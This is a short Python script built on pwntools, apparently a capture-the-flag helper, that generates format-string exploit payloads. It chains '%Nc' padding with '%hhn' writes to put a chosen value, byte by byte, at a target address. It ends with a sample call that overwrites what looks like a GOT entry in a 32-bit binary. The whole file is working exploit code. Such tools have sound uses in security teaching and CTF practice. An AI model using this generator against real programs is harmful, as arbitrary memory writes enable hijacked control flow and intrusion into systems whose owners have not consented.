from pwn import *

def fmt(alreadyputslen, targetlen, index):
    # print(alreadyputslen,targetlen)
    if alreadyputslen < targetlen:
        result = targetlen - alreadyputslen
        fmtstr = "%" + str(result) + "c"
    elif alreadyputslen == targetlen:
        result = 0
        fmtstr = ""
    else:
        result = 256 + targetlen - alreadyputslen
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + "AA" + "$hhn"
    return fmtstr


def creat_fmt_str(offset, system, addr, target,alreadyputslen):
    bytehublen=system/8
    payload = ""
    alreadyputslentmp=alreadyputslen
    #---------------------make the writen number
    for i in range(bytehublen):
        payload += fmt(alreadyputslentmp, (target >> i * 8) & 0xff, offset + i)
        alreadyputslentmp = (target >> i * 8) & 0xff
    fmtstrlen=len(payload)
    #---------------------add padding
    if(fmtstrlen % bytehublen !=0):
        payload+=(bytehublen-(fmtstrlen % bytehublen))*'Z'
    payloadindex=len(payload)/bytehublen
    addr_offset=offset+payloadindex
    padflag=0
    #---------------------add index and adjust padding
    for i in range(bytehublen):
        if len(str((addr_offset+i)))==1:
            padflag+=1
        payload=payload.replace("AA",str(addr_offset+i),1)
    payload+='Y'*padflag
    print(payload)
    #---------------------add addr
    for i in range(bytehublen):
        if system == 32:
            payload += p32(addr + i)

        else:
            payload += p64(addr + i)
    #---------------------

    return payload
#creat_fmt_str( str beginning offset %m just use m, system_bit, tar_addr,write_number,already_input)
payload = creat_fmt_str(8,32,0x0804A00C,0x08048400,4)
print(payload)





